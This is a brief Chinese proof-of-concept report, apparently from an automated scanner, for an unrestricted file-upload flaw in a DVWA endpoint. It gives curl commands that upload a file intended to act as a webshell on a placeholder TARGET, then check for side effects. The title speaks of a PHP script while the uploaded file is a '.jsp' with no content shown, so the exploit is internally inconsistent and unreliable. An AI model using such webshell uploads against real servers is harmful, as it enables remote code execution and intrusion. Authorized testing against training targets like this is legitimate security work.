# POC — DVWA 文件上传端点仅校验客户端可控的 MIME 类型，可上传任意 PHP 脚本导致远程代码执行

- finding_id: `LLM-916b10bd8caa`
- type: `file_upload` / CWE-434
- severity: `high`
- file: `045.php:26`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/045.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 不安全文件上传 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/045.php' \
  -F 'Upload=Upload' \
  -F 'uploaded=@sunset.jsp;filename=sunset.jsp'
```
预期：上传文件可访问/解析，返回 webshell 执行结果。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。